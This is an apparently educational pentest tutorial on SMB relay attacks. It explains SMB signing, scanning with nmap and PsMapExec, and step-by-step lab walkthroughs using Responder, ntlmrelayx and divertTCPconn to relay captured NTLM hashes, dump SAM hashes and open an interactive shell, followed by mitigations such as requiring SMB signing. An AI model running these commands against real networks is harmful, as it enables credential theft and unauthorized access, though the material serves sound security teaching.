# 🔨 SMB Relay

## What is it

A SMB relay attack is where an attacker captures a users NTLM hash and relays its to another machine on the network. Masquerading as the user and authenticating against SMB to gain shell or file access.

## Prerequisites

* SMB Signing disabled on target
* Must be on the local network
* User credentials must have remote login access for example; local admin to the target machine or member of the Domain Administrators group.

## SMB Signing

### What it does

SMB signing verifies the origin and authenticity of SMB packets. Effectively this stops MiTM SMB relay attacks from being successful. If this is enabled and required on a machine we will not be able to perform a successful SMB relay attack.

Systems that are vulnerable to this attack have SMB signing configured to the following:

* SMB Signing enabled but not required
* SMB Signing disabled

Systems that are not vulnerable to this attack have SMB signing configured to the following:

* SMB signing enabled and required

By default, only Domain Controllers have SMB signing set to required. However, Microsoft is now beginning to make this the default settings for all clients systems starting with Windows 11 Pro and Enterprise insider builds:  [https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-signing-required-by-default-in-windows-insider/ba-p/3831704](https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-signing-required-by-default-in-windows-insider/ba-p/3831704)

Otherwise, this setting needs to be rolled out by Group Policy to prevent relay attacks.

## Scanning for SMB signing disabled  or not required systems

**PsMapExec**&#x20;

If using Windows, PsMapExec can be used to identify domain joined systems for whether SMB signing is required or not.

```powershell
PsMapExec -Targets all -Method GenRelayList
```

<figure><img src="../../../.gitbook/assets/image (2106).png" alt=""><figcaption></figcaption></figure>

**Nmap**

Otherwise, Nmap can be used to check for potential SMB relay targets. Below, we check hosts on a CIDR range for SMB signing status.

```
nmap --script=smb2-security-mode.nse -p 445 -Pn --open 10.10.10.0/24
```

The results below show several systems for which SMB signing is enabled but not requred. Indiciating these systems are valid targets form SMB relay attacks.

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

If I run the same command against the Domain Controller on my network I get the following:

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

With 'Signing enabled and required' we will not be able to perform a SMB relay attack against that particular hosts. This is the default behaviour for Windows Servers that are Domain Controllers only.&#x20;

**Reference:** [https://learn.microsoft.com/en-gb/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2](https://learn.microsoft.com/en-gb/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2)

## Performing the attack from Windows

In the lab scenario we have two machines

* WS01 (Windows 10 22H2)(Attacker System)
* WS02 (Windows 10 22H2)(System used to trigger LLMNR)
* SRV02 (Windows Server 2019)(Not a Domain Controller)

We will be capturing a hash on WS01 using LLMNR Poisoning and performing a SMB relay attack to dump SAM  hashes on SRV02.

As per the prerequisites the user account hash we will be capturing (new.admin) is a member of the administrators group on the machine we will be relaying to (SRV02).

### Required Tools

**NTLMrelayx.exe:** [https://github.com/The-Viper-One/RedTeam-Binaries/blob/main/ntlmrelayx.exe](https://github.com/The-Viper-One/RedTeam-Binaries/blob/main/ntlmrelayx.exe)

**DivertTCPconn:** [https://github.com/Arno0x/DivertTCPconn/tree/master/compiled\_binaries/Binaries\_x64](https://github.com/Arno0x/DivertTCPconn/tree/master/compiled\_binaries/Binaries\_x64)



Configure DivertTCPconn to redirect SMB traffic to port 8445 <mark style="color:orange;">(Requires Local Admin)</mark>

```powershell
.\divertTCPConn.exe 445 8445
```

Set up NTLMRelayx

{% code overflow="wrap" %}
```powershell
# Dump SAM
.\ntlmrelayx.exe --smb-port 8445 -t [IP] or [CIDR] -smb2support

# Execute Command
.\ntlmrelayx.exe --smb-port 8445 -t [IP] or [CIDR] -smb2support -c "ipconfig"
```
{% endcode %}

Once both tools have been setup trigger LLMNR poisoning to capture a NTLMv2 request and then relay to a host that does not have SMB signing required.

{% content-ref url="llmnr.md" %}
[llmnr.md](llmnr.md)
{% endcontent-ref %}

\
\
Below, we have captured an authentication request for the user "new\_admin" and relayed it to SRV02 to dump the local SAM database.

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## Performing the attack from Linux

In the lab scenario we have three systems

* Kali Linux (Attacker System)
* WS02 (Windows 10 22H2)(System used to trigger LLMNR)
* SRV02 (Windows Server 2019)(Not a Domain Controller)

We will be capturing a hash on Kali Linux using LLMNR Poisoning and performing a SMB relay attack to gain shell on SRV02.

As per the prerequisites the user account hash we will be capturing (new.admin) is a member of the administrators group on the machine we will be relaying to (SRV02)

Ideally we will use `Responder` for this attack which comes preinstalled on Kali Linux. Before we start `Responder` we need to make a small change to the configuration file.

![](<../../../.gitbook/assets/image (1525).png>)

We need to turn off SMB and HTTP servers as we do not want to respond to these protocols as we will be capturing the hash and relaying it to a different tool called `ntlmrelayx.py` from Impacket.

Start Responder with the following command:

```
sudo python Responder.py -I eth0 -v
```

And then call ntlmrelayx.py from the Impacket directory.

```
sudo python ntlmrelayx.py -t [IP] or [CIDR] -smb2support
```

with both tools listening we can trigger an event using LLMNR as covered previously by myself in how to perform LLMNR Poisoning.

{% content-ref url="llmnr.md" %}
[llmnr.md](llmnr.md)
{% endcontent-ref %}

Responder has caught the user new.admin attempting to browse to a host that does not exists on the network. After DNS has failed to resolve the machine falls back to LLMNR which in this case we have caught the hash and relayed it over to ntlmrelayx.py.

ntlmrelayx.py then forwards the hash over to the machines specified with the `-t` switch which in this case is 10.10.10.20 or SRV02.

As the user new.admin is an administrator on SRVS02, `ntlmrelayx.py` has allowed us to dump the hashes in the SAM database.

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

We can then takes these hashes and crack them or we can even attempt a pass-the-hash attack and attempt to gain a shell with the NTLMv2 hash on a different machine on the network.

### Interactive Shell

We can gain a shell with the same manner above except this time we speciy the `-i` switch in ntlmrelayx.py.

```
sudo python ntlmrelayx.py -t 192.168.64.129 -smb2support -i
```

When we get a successful authentication message in ntlmrelayx.py we will need to open a netcat bind shell on the localhost and port specified in the ntlmrelayx.py output.

![](<../../../.gitbook/assets/image (1527) (1).png>)

Start netcat with a localhost address and the port specified in the output above.

```
nc 127.0.0.1 <port>
```

![](<../../../.gitbook/assets/image (1528).png>)

{% hint style="info" %}
Use the 'help' command once inside the SMB interactive shell to view more options
{% endhint %}

## Mitigations

### Enable SMB Signing

This attack can be mitigated by creating a group policy for signing to be required on all network machines.

![](<../../../.gitbook/assets/image (1529).png>)

After this has been enabled I repeated the steps above and attempted to relay a hash to the to a workstation for which which has group policy enabled for requiring SMB signing.

![](<../../../.gitbook/assets/image (1530).png>)

A downside to this setting which may effect the enironment is that signing adds overhead to the network traffic and reduces file transfer speed at around %15 however, security of the network far exceeds the loss in performance.

### Tiered Accounts

A major risk in this type of attack and also with LLMNR Poisoning is if a Domain Administrators hash was captured and either taken offline to be cracked or relayed elsewhere into the network. Introducing account tiers into the network would reduce exposure of these credentials being captured.

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material" %}

### Local Administrator Restrictions

Removing local administrator rights from users can help prevent lateral movement from the network. For example as per the above attack if the user new.admin was not an administrator on the relay target SRV02 the attack would have not been successful.
